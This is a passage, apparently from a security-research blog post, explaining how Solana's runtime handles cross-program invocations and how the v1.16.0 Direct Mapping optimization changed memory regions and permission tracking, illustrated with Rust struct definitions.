<p class="text-xl py-3 text-pretty sm:text-justify">Program A constructs a CPI instruction specifying the callee&#x27;s program ID and metadata of accounts involved. This includes each account&#x27;s address, whether the account&#x27;s owner has signed the instruction, and whether the account should be writable.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 2: Load Account Data</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">The runtime creates <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CallerAccount</code> structures by resolving <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo</code> structures from Program A&#x27;s VM memory. These <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CallerAccount</code> structures hold mutable references pointing directly into Program A&#x27;s serialized account data, and will be used later during CPI return to efficiently update the caller&#x27;s state.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#999">// Resolved view of AccountInfo with direct field access</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span></span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">CallerAccount</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                  </span><span class="token token" style="color:#999">// Direct mutable reference to lamports</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>                  </span><span class="token token" style="color:#999">// Direct mutable reference to owner</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    original_data_len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">,</span><span>               </span><span class="token token" style="color:#999">// Track size changes for realloc handling</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    serialized_data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>          </span><span class="token token" style="color:#999">// Points to serialized data in VM</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    vm_data_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                      </span><span class="token token" style="color:#999">// VM address of AccountInfo.data pointer</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>    ref_to_len_in_vm</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>          </span><span class="token token" style="color:#999">// VM address of AccountInfo.data length</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>    serialized_len_ptr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>    executable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>    rent_epoch</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">When Program B finishes execution, the runtime uses these mutable references to directly update Program A&#x27;s VM memory without additional lookup.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 3: Validation and Cache Update</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Before handing control to Program B, the runtime validates everything Program A has done so far, similar to the validation phase in single program execution. Only after validation passes are Program A&#x27;s changes written to the shared cache. This ensures that the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> always holds valid account state, so each program in the call chain sees only validated changes from previous programs.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 4: Serialization to Callee VM</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Program B gets its own fresh VM with a new <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region. All account data from the shared cache gets serialized and copied into Program B&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region, just like in single program execution. Program B can now run normally, seeing the same <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo</code> structures as if it were called directly.</p>
<h3 class="text-3xl py-4 border-b border-white/10">CPI Return Process</h3>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/cpi_return.png" alt="CPI Return"/></p>
<p class="text-xl py-3 text-pretty sm:text-justify">When Program B finishes execution, the runtime must ensure all changes from Program B are valid before merging them back to Program A. Here&#x27;s what happens:</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 1: Validation and Cache Update</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Program B&#x27;s VM states are revalidated using the same rules as single program execution. This prevents Program B from violating ownership rules, stealing funds, or modifying read-only accounts. Only validated changes are written back to the shared cache, again, ensuring <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> always holds valid account state for subsequent programs in the call chain.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 2: Memory Buffer Management</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Account data may grow during Program B&#x27;s execution when the program calls <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">realloc()</code> to expand account storage. This happens when programs need to add new data fields, grow vectors, store additional state information, or allocate space for user data like NFT metadata. To handle this growth efficiently, the runtime reserves extra padding beyond the current data length when accounts are initially serialized into Program A&#x27;s VM memory. This reserved space avoids expensive reallocation during execution. If Program B&#x27;s growth exceeds the reserved padding, the transaction immediately reverts.</p>
<h4 class="text-2xl py-4 border-b border-white/10">Step 3: Update Caller and Resume Execution</h4>
<p class="text-xl py-3 text-pretty sm:text-justify">Validated account states from the shared cache are copied back into Program A&#x27;s VM memory <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region. The runtime uses <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">CallerAccount</code> structures with their mutable references to efficiently update Program A&#x27;s serialized account data.</p>
<h3 class="text-3xl py-4 border-b border-white/10">The Performance Problem</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">Consider a typical DeFi swap with 4 nested program calls, each handling 10KB of account data. In the legacy model, each CPI call requires serializing this data into the callee&#x27;s VM, then copying it back on return. For our 4-level call chain, this means 40KB of serialization going down and 40KB of copying back up, totaling 80KB of memory operations for a single transaction.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">For a high-throughput blockchain processing thousands of complex transactions per second, this overhead becomes the performance bottleneck. Validators spent more time copying memory than executing actual program logic.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Solana needed a better runtime.</p>
<h2 class="text-4xl py-4 border-b border-white/10">The Optimization That Broke Everything: Direct Mapping (v1.16.0)</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">In Solana version 1.16.0, an optimization known as <strong>Direct Mapping</strong> was introduced to address the performance issues arising from repetitive serialization and deserialization of large account data. Instead of creating separate copies of account data in the VM&#x27;s INPUT region, Direct Mapping exposes the host&#x27;s actual account data buffers directly to the VM, allowing programs to read and write the same memory that the host uses to store account state. This optimization is only applied to the account data field, and not other fields such as account owner or lamport. The justification is that all other fields are relatively small is size, and the overhead of the optimization might outweigh the performance gained. Only the data field is large enough to justify such optimizations.</p>
<h3 class="text-3xl py-4 border-b border-white/10">MemoryRegion: The Foundation of VM Address Translation</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">Since we&#x27;re preparing to map host memory into the virtual guest memory space, it&#x27;s crucial to explain how Solana manages guest virtual memory.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The VM and host operate in separate address spaces. When a program running in the VM accesses memory at address <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">0x400000000</code>, this virtual address must be translated to an actual host memory location. Solana handles this translation through <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> structures:</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">MemoryRegion</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> host_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Cell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// start host address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>             </span><span class="token token" style="color:#999">// start virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr_end</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// end virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                 </span><span class="token token" style="color:#999">// Length in bytes</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_gap_shift</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// Address translation parameters</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> is_writable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Permission tracking</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">Each <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> maps a range of VM virtual addresses to host memory addresses. When the VM accesses memory, the runtime looks up the appropriate <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> and translates the virtual address to the corresponding host address.</p>
<h3 class="text-3xl py-4 border-b border-white/10">Legacy Model: Single MemoryRegion</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">In the legacy model, all account data was packed into one large serialized blob in the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">INPUT</code> region, managed by a single <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code>:</p>
<pre><code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">VM Address Range: 0x400000000 - 0x400100000
Host Address: Points to serialized account data buffer
State: Writable
</code></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">This single <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> contained all serialized account data in one contiguous buffer.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/legacy_memoryregion.png" alt="Legacy MemoryRegion"/></p>
<h3 class="text-3xl py-4 border-b border-white/10">Direct Mapping: Multiple MemoryRegions per Account</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">Direct Mapping fundamentally changes this architecture. Instead of creating separate copies of account data in a serialized buffer, Direct Mapping creates individual <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> for each account that point directly to the host&#x27;s <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> buffers. When a program accesses <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">account.data</code>, the VM translates this access through the account&#x27;s specific <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> to read or write the same memory buffer that the host uses to store the account state, eliminating the copying step entirely.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><img src="/blog/2025_06_27/new_memoryregion.png" alt="Legacy MemoryRegion"/></p>
<p class="text-xl py-3 text-pretty sm:text-justify">The diagram above shows this architectural shift: from one large <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> containing serialized copies to multiple <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegions</code> pointing directly to host account buffers.</p>
<h3 class="text-3xl py-4 border-b border-white/10">Changes to the MemoryRegion Structure</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">And just by this, we just got rid of the need for excessive copies! Sounds too good to be true, right?</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The optimization comes at a cost. Most noteably, Direct Mapping breaks the fundamental execution model that Solana previously relied upon. In the legacy model, programs could freely modify their VM memory because changes only affected local copies - validation happened afterward before committing to the host. With Direct Mapping, this approach no longer works because every VM write directly affects the actual account state recorded in the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountSharedData</code> within <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">TransactionContext</code> immediately. This forces Solana to implement immediate permission validation on every memory access.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">But what checks must be done? Is read and write checks sufficient? The answer, unfortunately, is no. We&#x27;ll start with presenting the changes to the MemoryRegion structure, and work our way back to the reasons behind the change.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">MemoryRegion</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> host_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Cell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// start host address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>             </span><span class="token token" style="color:#999">// start virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_addr_end</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// end virtual address</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> len</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>                 </span><span class="token token" style="color:#999">// Length in bytes</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> vm_gap_shift</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>         </span><span class="token token" style="color:#999">// Address translation parameters</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> state</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Cell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#999">// Permission tracking</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">enum</span><span> </span><span class="token token type-definition" style="color:#f8c555">MemoryState</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>    </span><span class="token token" style="color:#f8c555">Readable</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// The memory region is readable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span>    </span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// The memory region is writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>    </span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// The memory region is writable but must be copied before writing</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">Each <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> now tracks its permission state and enforces access controls on data writes. When a program tries to write to account data, the runtime immediately checks the region&#x27;s state and either allows the write, triggers a copy-on-write operation, or rejects the access entirely.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The key change is the addition of the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">state</code> field that replaces the simple <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">is_writable</code> boolean. This allows for more sophisticated permission management, particularly the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Cow(u64)</code> state that triggers copy-on-write operations when needed.</p>
